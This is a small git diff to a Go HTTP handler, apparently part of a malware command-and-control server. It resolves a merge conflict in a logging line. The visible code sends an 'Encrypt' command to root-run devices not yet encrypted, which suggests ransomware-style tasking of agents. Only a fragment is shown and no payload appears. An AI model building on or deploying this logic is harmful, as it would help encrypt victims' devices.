@@ -78,11 +78,7 @@ func CommandHandler(w http.ResponseWriter, r *http.Request) {
 	//Reads the header of the request and issue commands
 	//Tied to Agent.KeepAlive()
 
-<<<<<<< HEAD
 	color.Red("Device %s requesting commands \n", device.ID)
-=======
-	log.Printf("Device %s requesting commands \n", device.ID)
->>>>>>> origin
 	if device.User == "Root" && !device.Encrypted {
 		w.WriteHeader(http.StatusOK)
 		command := []byte("Encrypt")
